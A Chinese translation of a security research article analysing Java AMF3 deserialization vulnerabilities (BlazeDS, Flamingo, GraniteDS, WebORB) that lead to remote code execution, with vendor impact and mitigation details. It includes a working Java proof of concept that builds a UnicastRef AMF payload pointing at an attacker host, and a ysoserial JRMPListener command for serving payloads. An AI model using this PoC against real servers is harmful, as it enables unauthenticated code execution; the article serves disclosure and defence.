
# 【技术分享】Java AMF3 反序列化漏洞分析


                                阅读量   
                                **163216**
                            
                        |
                        
                                                                                                                                    ![](./img/85846/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[https://codewhitesec.blogspot.it/2017/04/amf.html](https://codewhitesec.blogspot.it/2017/04/amf.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/85846/t013df655065cd4629f.png)](./img/85846/t013df655065cd4629f.png)

翻译：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)

预估稿费：170RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**写在前面的话**

AMF（Action Message Format）是一种二进制序列化格式，之前主要是Flash应用程序在使用这种格式。近期，Code White发现有多个Java AMF库中存在漏洞，而这些漏洞将导致未经身份验证的远程代码执行。由于AMF目前已经得到了广泛的使用，因此可能会有多家厂商的产品将受到这些漏洞的影响，例如Adobe、Atlassian、HPE、SonicWall和VMware等等。

目前，漏洞相关信息已上报至美国CERT（详情请参考美国CERT [VU#307983](https://www.kb.cert.org/vuls/id/307983)）

<br>

**概述**

目前，Code White主要对以下几种热门的Java AMF实现：

Flex BlazeDS by Adobe 

Flex BlazeDS by Apache

Flamingo AMF Serializer by Exadel (已停更)

GraniteDS (已停更)

WebORB for Java by Midnight Coders

而这些又存在着下面列出的一个或多个漏洞：

XML外部实体注入（XXE）

任意对象创建及属性设置

通过RMI实现Java序列化

<br>

**漏洞影响**

简而言之，任意远程攻击者如果能够欺骗并控制服务器的通信连接，那么他将有可能向目标主机发送能够执行任意代码的序列化Java对象，当该对象在目标主机中进行反序列化之后，恶意代码将会被执行。

前两个漏洞并不是新漏洞，但是目前仍然有很多库存在这样的漏洞。除此之外，研究人员也发现了一种能够将这种设计缺陷转换成Java序列化漏洞的方法。

[![](./img/85846/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0184e75858cd6b49c5.png)

我们将会对上述漏洞（除了XXE）进行详细描述，如果你想了解关于这个XXE漏洞的详细内容，请参考我们之前所发表的一篇文章《[CVE-2015-3269: Apache Flex BlazeDS XXE Vulnerabilty](http://codewhitesec.blogspot.en/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html)》。

<br>

**介绍**

AMF3（Action Message Format version 3）同样是一种二进制信息编码格式，它也是Flash应用在与后台交互时主要使用的一种数据格式。与JSON类似，它支持不同的数据类型。考虑到向后兼容性，AMF3实际上算是AMF的一种拓展实现，并且引入了新的对象类型。

AMF3对象的新功能可以归结为两种新增加的特性，而这两种新特性（dynamic和externalizable）描述了对象是如何进行序列化操作的：

**Dynamic：**一个声明了动态特性的类实例；公共变量成员可以在程序运行时动态添加（或删除）到实例中。

**Externalizable：**实现flash.utils.IExternalizable并完全控制其成员序列化的类实例。

注：具体请参考Adobe官方给出的解释【[传送门](http://www.adobe.com/go/amfspec)】。

<br>

**Dynamic特性**

我们可以拿Dynamic特性与JavaBeans的功能进行对比：它允许我们通过类名及属性来创建一个对象。实际上，很多JavaBeans实体目前已经实现了这种技术，例如java.beans.Introspector、Flamingo、Flex BlazeDS和WebORB等等。

但需要注意的是，这种功能将会导致一种可利用的漏洞产生。实际上，[Wouter Coekaerts早在2011年就已经将这种存在于AMF实现中的漏洞曝光了](http://wouter.coekaerts.be/2011/amf-arbitrary-code-execution)，并且还在2016年发布了相应漏洞的利用代码及PoC。

<br>

**Externalizable特性**

我们可以拿Externalizable特性赖于Java的java.io.Externalizable接口进行对比。实际上，很多厂商早就已经将flash.utils.IExternalizable接口的规范进行了调整，其实它与Java的java.io.Externalizable区别不大，这种特性将允许我们可以高效地对实现了java.io.Externalizable接口的类进行重构。

java.io.Externalizable接口定义了两个方法：即readExternal（java.io.ObjectInput）和writeExternal（java.io.ObjectInput），而这两个方法将允许java类完全控制序列化以及反序列化操作。这也就意味着，在程序的运行过程中不存在默认的序列化／反序列化行为以及有效性检测。因此，相对于java.io.Serializable来说，我们使用java.io.Externalizable来实现序列化／反序列化则更加的简单和高效。

<br>

**将EXTERNALIZABLE.READEXTERNAL转换为OBJECTINPUTSTREAM.READOBJECT**

在OpenJDK 8u121中总共有十五个类实现了java.io.Externalizable接口，而其中绝大多数类的任务仅仅是重构一个对象的状态而已。除此之外，实际传递给Externalizable.readExternal（java.io.ObjectInput）方法的java.io.ObjectInput实例也并非java.io.ObjectInputStream的实例。

在这十五个类中，那些与RMI有关的类则吸引了我们的注意。尤其是sun.rmi.server.UnicastRef和sun.rmi.server.UnicastRef2，因为他们会通过sun.rmi.transport.LiveRef.read(ObjectInput, boolean)方法来对sun.rmi.transport.LiveRef对象进行重构。除此之外，这个方法还会重构一个sun.rmi.transport.tcp.TCPEndpoint对象以及一个本地sun.rmi.transport.LiveRef对象，并且在sun.rmi.transport.DGCClient中进行注册。其中，DGCClient负责实现客户端的RMI分布式垃圾回收系统。DGCClient的外部接口为“registerRefs”方法，当一个LiveRef的远程对象需要进入虚拟机系统时，它需要在DGCClient中进行注册。关于DGCClient的更多内容请参考OpenJDK给出的官方文档【[传送门](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u121-b00/src/share/classes/sun/rmi/transport/DGCClient.java#l54)】。

根据官方文档中的描述，LiveRef的注册是由一次远程调用完成的，而我们觉得这里将有可能允许我们通过RMI来实现远程代码执行（RCE）！

在对这次调用进行了追踪分析之后，我们发现整个调用过程非常复杂，它涉及到Externalizable.readExternal、sun.rmi.server.UnicastRef/sun.rmi.server.UnicastRef2、ObjectInputStream.readObject以及sun.rmi.transport.StreamRemoteCall.executeCall()等多种对象及方法。

[![](./img/85846/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fcd740767cabd425.png)

接下来让我们来看看，如果我们通过一个sun.rmi.server.UnicastRef对象来对一条AMF消息进行反序列化的话会出现什么情况，相关代码如下所示（利用了Flex BlazeDS）：



```
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Arrays;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.ActionContext;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.amf.AmfMessageDeserializer;
import flex.messaging.io.amf.AmfMessageSerializer;
import flex.messaging.io.amf.MessageBody;
public class Amf3ExternalizableUnicastRef {
public static void main(String[] args) throws IOException, ClassNotFoundException {
if (args.length &lt; 2 || (args.length == 3 &amp;&amp; !args[0].equals("-d"))) {
System.err.println("usage: java -jar " + Amf3ExternalizableUnicastRef.class.getSimpleName() + ".jar [-d] &lt;host&gt; &lt;port&gt;");
return;
}
boolean doDeserialize = false;
if (args.length == 3) {
doDeserialize = true;
args = Arrays.copyOfRange(args, 1, args.length);
}
// generate the UnicastRef object
Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));
// serialize object to AMF message
byte[] amf = serialize(unicastRef);
// deserialize AMF message
if (doDeserialize) {
deserialize(amf);
} else {
System.out.write(amf);
}
}
public static Object generateUnicastRef(String host, int port) {
java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
return new sun.rmi.server.UnicastRef(liveRef);
}
public static byte[] serialize(Object data) throws IOException {
MessageBody body = new MessageBody();
body.setData(data);
ActionMessage message = new ActionMessage();
message.addBody(body);
ByteArrayOutputStream out = new ByteArrayOutputStream();
AmfMessageSerializer serializer = new AmfMessageSerializer();
serializer.initialize(SerializationContext.getSerializationContext(), out, null);
serializer.writeMessage(message);
return out.toByteArray();
}
public static void deserialize(byte[] amf) throws ClassNotFoundException, IOException {
ByteArrayInputStream in = new ByteArrayInputStream(amf);
AmfMessageDeserializer deserializer = new AmfMessageDeserializer();
deserializer.initialize(SerializationContext.getSerializationContext(), in, null);
deserializer.readMessage(new ActionMessage(), new ActionContext());
}
}
```

为了证实代码能够正常运行，我们首先设置了一个监听器，然后看一看链接是否能够成功建立。

[![](./img/85846/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01af75f34c45ece17c.png)

此时，我们成功地与客户端建立了一条通信连接，而且使用的还是[Java RMI传输协议](https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html)。

<br>

**漏洞利用**

实际上，jacob Baines早在2016年就已经将这项技术（[反序列化黑名单绕过](https://www.tenable.com/security/research/tra-2017-07)）公之于众了，但是我并不确定当时他是否知道这种技术同样还会将任意的Externalizable.readExternal对象转换为ObjectInputStream.readObject对象。除此之外，他当时还介绍了一个可以发送任意Payload的JRMP监听器：

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener ...
```



**厂商产品影响情况**
<td width="341" valign="top">Apache Software Foundation</td><td width="341" valign="top">[Affected](https://www.kb.cert.org/vuls/id/BLUU-AKVRGX)</td><td width="341" valign="top">28 Mar 2017</td><td width="341" valign="top">06 Apr 2017</td>
<td width="341" valign="top">Atlassian</td><td width="341" valign="top">[Affected](https://www.kb.cert.org/vuls/id/GWAN-AKHSWU)</td><td width="341" valign="top">–</td><td width="341" valign="top">28 Mar 2017</td>
<td width="341" valign="top">Exadel</td><td width="341" valign="top">[Unknown](https://www.kb.cert.org/vuls/id/BLUU-AKVRGK)</td><td width="341" valign="top">28 Mar 2017</td><td width="341" valign="top">28 Mar 2017</td>
<td width="341" valign="top">Granite Data Services</td><td width="341" valign="top">[Unknown](https://www.kb.cert.org/vuls/id/BLUU-AKHTCH)</td><td width="341" valign="top">16 Mar 2017</td><td width="341" valign="top">16 Mar 2017</td>
<td width="341" valign="top">Hewlett Packard Enterprise</td><td width="341" valign="top">[Unknown](https://www.kb.cert.org/vuls/id/BLUU-AKVRGU)</td><td width="341" valign="top">28 Mar 2017</td><td width="341" valign="top">28 Mar 2017</td>
<td width="341" valign="top">Midnight Coders</td><td width="341" valign="top">[Unknown](https://www.kb.cert.org/vuls/id/BLUU-AKHTCK)</td><td width="341" valign="top">16 Mar 2017</td><td width="341" valign="top">03 Apr 2017</td>
<td width="341" valign="top">Pivotal</td><td width="341" valign="top">[Unknown](https://www.kb.cert.org/vuls/id/BLUU-AKVRGM)</td><td width="341" valign="top">28 Mar 2017</td><td width="341" valign="top">28 Mar 2017</td>
<td width="341" valign="top">SonicWall</td><td width="341" valign="top">[Unknown](https://www.kb.cert.org/vuls/id/BLUU-AKVRGH)</td><td width="341" valign="top">28 Mar 2017</td><td width="341" valign="top">28 Mar 2017</td>
<td width="341" valign="top">VMware</td><td width="341" valign="top">[Unknown](https://www.kb.cert.org/vuls/id/BLUU-AKHTCM)</td><td width="341" valign="top">16 Mar 2017</td><td width="341" valign="top">16 Mar 2017</td>

<br>

**缓解方案**

首先，使用了Adobe或Apache实现的应用程序应该尽快将Apache更新至最新版本（v4.7.3）。其次，Exadel目前已经停止对他的代码库进行维护了，所以使用了Flamingo AMF Serializer的用户不会再收到更新推送了。不过目前对于GraniteDS和WebORB还没有合适的解决方案。

<br>

**参考资料**

[http://codewhitesec.blogspot.com/2017/04/amf.html](http://codewhitesec.blogspot.com/2017/04/amf.html) 

[http://openjdk.java.net/jeps/290](http://openjdk.java.net/jeps/290) 

[http://www.kb.cert.org/vuls/id/279472](http://www.kb.cert.org/vuls/id/279472) 

[http://www.adobe.com/go/amfspec](http://www.adobe.com/go/amfspec) 

[https://cwe.mitre.org/data/definitions/502.html](https://cwe.mitre.org/data/definitions/502.html) 

[https://cwe.mitre.org/data/definitions/913.html](https://cwe.mitre.org/data/definitions/913.html) 

[https://cwe.mitre.org/data/definitions/611.html](https://cwe.mitre.org/data/definitions/611.html) 

<br>

**其他信息**

**CVE ID：**

CVE-2015-3269、CVE-2016-2340、CVE-2017-5641、CVE-2017-5983、CVE-2017-3199、CVE-2017-3200、CVE-2017-3201、CVE-2017-3202、CVE-2017-3203、CVE-2017-3206、CVE-2017-3207、CVE-2017-3208

**公开日期：**2017年4月4日

**最新更新日期：**2017年4月4日

**文档版本：**73
